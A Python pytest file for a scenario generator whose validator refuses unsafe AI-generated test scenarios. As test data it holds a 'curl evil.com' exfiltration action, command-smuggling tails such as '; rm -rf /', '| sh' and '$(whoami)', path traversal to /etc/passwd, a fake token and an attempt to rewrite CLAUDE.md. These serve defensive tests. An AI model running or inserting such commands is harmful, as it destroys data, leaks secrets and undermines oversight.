"""Structured generation, fail-closed parsing, and the deterministic safety wall.

Every test here drives the generator with a scripted reasoner. Nothing consumes
Claude usage, and nothing executes a product.
"""

from __future__ import annotations

import pytest

from neyma_product_driver.scenario_generator import (
    parse_notes,
    parse_risks,
    parse_scenarios,
)
from neyma_product_driver.scenario_plan import (
    CompilationError,
    GeneratedAction,
    GeneratedRequest,
    GeneratedStateCheck,
    Priority,
    RiskCategory,
    ScenarioProvenance,
    compile_to_scenario,
    neighbours,
)
from neyma_product_driver.scenario_validation import (
    ApprovedCommands,
    validate_plan,
    validate_scenario,
)

from scenario_fixtures import (
    APPROVED_CLEANUP,
    APPROVED_STATE,
    base_scenario,
    make_scenario,
    raw_payload,
    raw_scenario,
    validation_context,
)


# --------------------------------------------------------------------------
# Parsing
# --------------------------------------------------------------------------


def _provenance() -> ScenarioProvenance:
    return ScenarioProvenance(wave=1, stage="initial", generating_risk="a stated risk")


class TestStructuredParsing:
    def test_a_well_formed_payload_becomes_models(self):
        payload = raw_payload(raw_scenario())
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())

        assert not malformed
        assert len(parsed) == 1
        scenario = parsed[0]
        assert scenario.id == "gen-approve-twice"
        assert scenario.risk_category is RiskCategory.IDEMPOTENCY
        assert scenario.priority is Priority.P0
        assert scenario.actions[0].request is not None
        assert scenario.actions[0].request.method == "POST"

    def test_provenance_records_why_the_scenario_exists(self):
        provenance = ScenarioProvenance(
            wave=2,
            stage="diff_refinement",
            repository_head="abc1234",
            active_unit_id="U-042",
            diff_files_consulted=["src/approval.py"],
        )
        parsed, _ = parse_scenarios(raw_payload(raw_scenario()), provenance=provenance)

        recorded = parsed[0].provenance
        assert recorded.stage == "diff_refinement"
        assert recorded.wave == 2
        assert recorded.repository_head == "abc1234"
        assert recorded.diff_files_consulted == ["src/approval.py"]
        # The risk that caused THIS scenario, not the wave's generic one.
        assert recorded.generating_risk == "duplicate approval could double-pay"
        assert "duplicate approval could double-pay" in recorded.render()

    def test_risks_and_notes_parse(self):
        payload = raw_payload(raw_scenario())
        risks = parse_risks(payload)
        assumptions, questions = parse_notes(payload)

        assert [r.risk_category for r in risks] == [RiskCategory.IDEMPOTENCY]
        assert risks[0].severity is Priority.P0
        assert assumptions == ["the approval endpoint is POST /approve"]
        assert questions == []


class TestMalformedOutputFailsClosed:
    @pytest.mark.parametrize(
        "payload",
        [None, "a string", 42, [], {"scenarios": "not a list"}, {}],
    )
    def test_unusable_payloads_produce_nothing(self, payload):
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())
        assert parsed == []
        assert malformed == []
        assert parse_risks(payload) == []

    def test_an_unknown_risk_category_is_refused_not_guessed(self):
        payload = raw_payload(raw_scenario(risk_category="vibes"))
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())

        assert parsed == []
        assert "unknown risk_category" in malformed[0][1][0]

    def test_a_scenario_missing_a_title_is_dropped_with_a_reason(self):
        payload = raw_payload(raw_scenario(title=""))
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())

        assert parsed == []
        assert malformed[0][1] == ["scenario has no title"]

    def test_an_unmodellable_action_drops_the_scenario_rather_than_repairing_it(self):
        payload = raw_payload(
            raw_scenario(actions=[{"kind": "exfiltrate", "command": "curl evil.com"}])
        )
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())

        assert parsed == []
        assert malformed and any("actions" in reason for reason in malformed[0][1])

    def test_a_partially_malformed_batch_keeps_the_good_entries(self):
        payload = raw_payload(
            raw_scenario("good-one"),
            raw_scenario("bad-one", risk_category="not-a-category"),
        )
        parsed, malformed = parse_scenarios(payload, provenance=_provenance())

        assert [s.id for s in parsed] == ["good-one"]
        assert len(malformed) == 1


# --------------------------------------------------------------------------
# The approved command set
# --------------------------------------------------------------------------


class TestApprovedCommands:
    def test_commands_are_harvested_from_human_written_scenarios(self):
        approved = ApprovedCommands.from_sources(scenarios=[base_scenario()])
        assert approved.approves(APPROVED_STATE)[0]
        assert approved.approves(APPROVED_CLEANUP)[0]

    def test_extra_arguments_on_an_approved_command_are_permitted(self):
        approved = ApprovedCommands.from_sources(scenarios=[base_scenario()])
        ok, why = approved.approves(f"{APPROVED_STATE} --tenant acme")
        assert ok, why

    def test_a_prefix_cannot_smuggle_a_second_command(self):
        approved = ApprovedCommands.from_sources(scenarios=[base_scenario()])
        for tail in ("&& git push", "; rm -rf /", "| sh", "> /etc/passwd", "$(whoami)"):
            ok, why = approved.approves(f"{APPROVED_STATE} {tail}")
            assert not ok, tail
            assert "shell composition" in why or "hard-blocked" in why

    def test_an_unlisted_command_is_refused(self):
        approved = ApprovedCommands.from_sources(scenarios=[base_scenario()])
        ok, why = approved.approves("python -c 'import os; os.system(\"id\")'")
        assert not ok
        assert "not in the approved set" in why or "hard-blocked" in why

    def test_a_hard_blocked_command_is_refused_even_if_configured(self):
        # Configuring it does not make it safe: the existing command guard has
        # the final word, exactly as it does for the builder.
        approved = ApprovedCommands.from_sources(configured=["git push origin main"])
        ok, why = approved.approves("git push origin main")
        assert not ok
        assert "hard-blocked" in why

    def test_with_no_approved_commands_no_command_may_run(self):
        approved = ApprovedCommands([])
        ok, why = approved.approves("echo hi")
        assert not ok
        assert "no approved commands are configured" in why


# --------------------------------------------------------------------------
# Deterministic validation
# --------------------------------------------------------------------------


class TestUnsafeOperationsRejected:
    def test_an_unapproved_command_action_is_rejected(self):
        scenario = make_scenario(
            actions=[GeneratedAction(kind="command", command="curl -X POST https://api.example.com")]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("unsafe or unapproved operation" in r for r in reasons)

    def test_a_non_loopback_request_is_rejected_as_an_external_effect(self):
        scenario = make_scenario(
            actions=[
                GeneratedAction(
                    kind="request",
                    request=GeneratedRequest(method="POST", url="https://api.stripe.com/charges"),
                )
            ]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("unsupported external effect" in r for r in reasons)

    def test_a_non_loopback_browser_navigation_is_rejected(self):
        from neyma_product_driver.scenario_plan import GeneratedBrowserStep

        scenario = make_scenario(
            mode="browser",
            actions=[
                GeneratedAction(
                    kind="browser",
                    browser_steps=[GeneratedBrowserStep(goto="https://example.com/admin")],
                )
            ],
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("unsupported external navigation" in r for r in reasons)

    def test_credential_material_is_rejected(self):
        scenario = make_scenario(
            actions=[
                GeneratedAction(
                    kind="request",
                    request=GeneratedRequest(
                        method="POST",
                        path="/approve",
                        headers={"Authorization": "Bearer ghp_abcdefghijklmnopqrstuvwxyz01"},
                    ),
                )
            ]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("credential material" in r for r in reasons)

    def test_reading_a_credential_environment_variable_is_rejected(self):
        scenario = make_scenario(
            actions=[
                GeneratedAction(
                    kind="request",
                    request=GeneratedRequest(path="/x", body="token=$GITHUB_TOKEN"),
                )
            ]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("credential" in r for r in reasons)

    def test_an_ordinary_password_field_is_still_allowed(self):
        # Authorization scenarios must remain expressible: refusing anything
        # containing the word "password" would delete the whole category.
        scenario = make_scenario(
            risk_category=RiskCategory.AUTHORIZATION,
            actions=[
                GeneratedAction(
                    kind="request",
                    request=GeneratedRequest(
                        method="POST",
                        path="/login",
                        json_body={"user": "carrier-b", "password": "not-the-owner"},
                        expect_status=403,
                        # The response is what prints it, and the scenario has
                        # to say so: an asserted literal no operation declares
                        # is refused as an unattributable oracle.
                        expect_contains=["not authorized"],
                    ),
                )
            ],
            state_checks=[],
            expected_observations=["not authorized"],
        )
        assert validate_scenario(scenario, validation_context()) == []

    def test_touching_repository_authority_is_rejected(self):
        scenario = make_scenario(
            actions=[
                GeneratedAction(
                    kind="fixture", fixture_name="CLAUDE.md", fixture_content="rules are relaxed"
                )
            ]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("repository authority" in r for r in reasons)

    def test_a_fixture_path_cannot_escape_the_evidence_directory(self):
        for name in ("../../etc/passwd", "/etc/passwd", "sub/dir.json"):
            scenario = make_scenario(
                actions=[GeneratedAction(kind="fixture", fixture_name=name, fixture_content="x")]
            )
            reasons = validate_scenario(scenario, validation_context())
            assert any("bare filename" in r for r in reasons), name

    def test_an_undeclared_service_cannot_be_restarted(self):
        scenario = make_scenario(
            service_refs=["database"],
            actions=[GeneratedAction(kind="restart_service", service="database")],
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("no base scenario declares" in r for r in reasons)

    def test_waits_and_timeouts_are_bounded(self):
        scenario = make_scenario(actions=[GeneratedAction(kind="wait", wait_ms=600_000)])
        reasons = validate_scenario(scenario, validation_context())
        assert any("exceeds the" in r for r in reasons)


class TestQualityContract:
    def test_an_ungrounded_requirement_is_rejected(self):
        scenario = make_scenario(
            requirement_reference="the product should feel premium and modern"
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("may not invent a product requirement" in r for r in reasons)

    def test_a_missing_requirement_reference_is_rejected(self):
        scenario = make_scenario(requirement_reference="")
        reasons = validate_scenario(scenario, validation_context())
        assert any("no requirement_reference" in r for r in reasons)

    def test_an_ungrounded_product_principle_is_rejected(self):
        scenario = make_scenario(product_principle_reference="general good taste")
        reasons = validate_scenario(scenario, validation_context())
        assert any("founder rubric category" in r for r in reasons)

    def test_an_ac_id_grounds_a_requirement(self):
        scenario = make_scenario(requirement_reference="AC-PAY-014")
        assert validate_scenario(scenario, validation_context()) == []

    def test_a_scenario_with_no_observable_outcome_is_rejected(self):
        scenario = make_scenario(
            risk_category=RiskCategory.HAPPY_PATH,
            actions=[GeneratedAction(kind="request", request=GeneratedRequest(path="/health"))],
            state_checks=[],
            expected_observations=[],
            forbidden_observations=[],
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("no observable outcome" in r for r in reasons)

    def test_an_effect_claim_without_a_state_oracle_is_rejected(self):
        # An HTTP 200 is not evidence that the effect happened.
        scenario = make_scenario(
            risk_category=RiskCategory.TIMEOUT_AFTER_EFFECT,
            state_checks=[],
            expected_observations=["accepted"],
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("inspects no persisted state" in r for r in reasons)
        assert any("is not evidence" in r for r in reasons)

    @pytest.mark.parametrize(
        "category",
        [
            RiskCategory.IDEMPOTENCY,
            RiskCategory.RETRY_SAFETY,
            RiskCategory.AMBIGUOUS_EXTERNAL_EFFECT,
            RiskCategory.RESTART_RECOVERY,
            RiskCategory.PERSISTENCE_FAILURE,
        ],
    )
    def test_every_effect_category_needs_an_oracle(self, category):
        scenario = make_scenario(
            risk_category=category, state_checks=[], expected_observations=["done"]
        )
        reasons = validate_scenario(scenario, validation_context())
        assert any("inspects no persisted state" in r for r in reasons)

    def test_mutating_state_without_cleanup_is_rejected(self):
        scenario = make_scenario(cleanup=[], isolation_note="")
        reasons = validate_scenario(scenario, validation_context())
        assert any("neither cleanup commands nor an isolation strategy" in r for r in reasons)

    def test_an_isolation_note_substitutes_for_cleanup(self):
        scenario = make_scenario(
            cleanup=[], isolation_note="writes only to a fixture in the evidence directory"
        )
        assert validate_scenario(scenario, validation_context()) == []

    def test_a_regression_scenario_must_justify_its_scope(self):
        scenario = make_scenario(risk_category=RiskCategory.REGRESSION, generated_from=[])
        reasons = validate_scenario(scenario, validation_context())
        assert any("puts the behaviour it guards inside this task's scope" in r for r in reasons)

    def test_a_regression_scenario_grounded_in_the_diff_is_accepted(self):
        scenario = make_scenario(risk_category=RiskCategory.REGRESSION)
        # Extend the realistic stamp rather than replacing it: the diff basis is
        # what this test is about, and the rest of the provenance is what every
        # generated scenario carries.
        scenario.provenance = scenario.provenance.model_copy(
            update={"diff_files_consulted": ["src/approval.py"]}
        )
        assert validate_scenario(scenario, validation_context()) == []

    def test_a_scenario_with_no_actions_is_rejected(self):
        scenario = make_scenario(actions=[])
        reasons = validate_scenario(scenario, validation_context())
        assert any("performs no actions" in r for r in reasons)


class TestDuplicateDetection:
    def test_a_repeat_of_an_accepted_scenario_is_rejected(self):
        first = make_scenario("gen-1")
        second = make_scenario("gen-2")  # same operations, same expectations

        accepted, refused = validate_plan([first, second], validation_context())

        assert [s.id for s in accepted] == ["gen-1"]
        assert any("duplicate" in r for r in refused[0][1])

    def test_relabelling_the_risk_does_not_buy_a_second_slot(self):
        first = make_scenario("gen-1", risk_category=RiskCategory.IDEMPOTENCY)
        second = make_scenario("gen-2", risk_category=RiskCategory.REPEATED_REQUEST)

        accepted, refused = validate_plan([first, second], validation_context())

        assert [s.id for s in accepted] == ["gen-1"]
        assert any("duplicate" in r for r in refused[0][1])

    def test_a_scenario_adding_new_expectations_is_not_a_duplicate(self):
        first = make_scenario("gen-1")
        second = make_scenario("gen-2", forbidden_observations=["payments=2"])

        accepted, _refused = validate_plan([first, second], validation_context())
        assert [s.id for s in accepted] == ["gen-1", "gen-2"]

    def test_a_repeat_of_a_permanent_scenario_is_rejected(self):
        from neyma_product_driver.scenario_validation import permanent_signatures

        permanent = base_scenario()
        # A generated scenario that does exactly what the permanent one does.
        twin = make_scenario(
            actions=[GeneratedAction(kind="command", command=APPROVED_STATE)],
            state_checks=[GeneratedStateCheck(command=APPROVED_STATE, contains=["ok"])],
            expected_observations=[],
            forbidden_observations=[],
        )
        context = validation_context(existing_signatures=permanent_signatures([permanent]))

        assert any("duplicate" in r for r in validate_scenario(twin, context))

    def test_a_reused_id_is_rejected(self):
        context = validation_context(existing_ids={"gen-1"})
        reasons = validate_scenario(make_scenario("gen-1"), context)
        assert any("already used in this run" in r for r in reasons)


# --------------------------------------------------------------------------
# Compilation
# --------------------------------------------------------------------------


class TestCompilation:
    def test_a_validated_scenario_compiles_to_ordered_steps(self):
        scenario = make_scenario(
            actions=[
                GeneratedAction(
                    kind="request", request=GeneratedRequest(method="POST", path="/approve")
                ),
                GeneratedAction(kind="restart_service", service="api"),
                GeneratedAction(
                    kind="request", request=GeneratedRequest(method="GET", path="/invoice")
                ),
            ]
        )
        compiled = compile_to_scenario(
            scenario, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
        )

        assert [s.kind for s in compiled.steps] == [
            "request",
            "restart_service",
            "request",
            "state_check",
        ]
        # Ordering is the whole point: the restart sits between the two calls.
        assert compiled.steps[1].service == "api"
        # Services, readiness and app_url come from the base, never invented.
        assert [s.name for s in compiled.services] == ["api"]
        assert compiled.app_url == base_scenario().app_url
        assert compiled.readiness == base_scenario().readiness

    def test_the_compiler_refuses_a_command_not_in_the_approved_set(self):
        # Independent of validation on purpose: a command that somehow slipped
        # past validation must still not become a subprocess.
        scenario = make_scenario(
            actions=[GeneratedAction(kind="command", command="rm -rf /")],
        )
        with pytest.raises(CompilationError, match="approved command set"):
            compile_to_scenario(scenario, base=base_scenario(), approved_commands={APPROVED_STATE})

    def test_the_compiler_refuses_an_undeclared_service(self):
        scenario = make_scenario(service_refs=["ghost"])
        with pytest.raises(CompilationError, match="does not declare"):
            compile_to_scenario(
                scenario, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
            )

    def test_compiled_description_carries_the_provenance(self):
        scenario = make_scenario()
        compiled = compile_to_scenario(
            scenario, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
        )
        assert "duplicate approval could double-pay" in compiled.description
        assert "U-042" in compiled.description

    def test_parallel_requests_compile_to_one_concurrent_step(self):
        scenario = make_scenario(
            risk_category=RiskCategory.CONCURRENCY,
            actions=[
                GeneratedAction(
                    kind="parallel_requests",
                    requests=[
                        GeneratedRequest(method="POST", path="/approve", name="operator-a"),
                        GeneratedRequest(method="POST", path="/approve", name="operator-b"),
                    ],
                )
            ],
        )
        compiled = compile_to_scenario(
            scenario, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
        )
        assert compiled.steps[0].kind == "parallel_requests"
        assert [r.name for r in compiled.steps[0].requests] == ["operator-a", "operator-b"]


class TestRiskFamilies:
    def test_neighbours_are_symmetric_within_a_family(self):
        assert RiskCategory.CONCURRENCY in neighbours(RiskCategory.IDEMPOTENCY)
        assert RiskCategory.IDEMPOTENCY in neighbours(RiskCategory.CONCURRENCY)

    def test_an_unrelated_category_is_not_a_neighbour(self):
        assert RiskCategory.AUTHORIZATION not in neighbours(RiskCategory.IDEMPOTENCY)

    def test_a_category_in_no_family_neighbours_only_itself(self):
        assert neighbours(RiskCategory.HAPPY_PATH) == frozenset({RiskCategory.HAPPY_PATH})
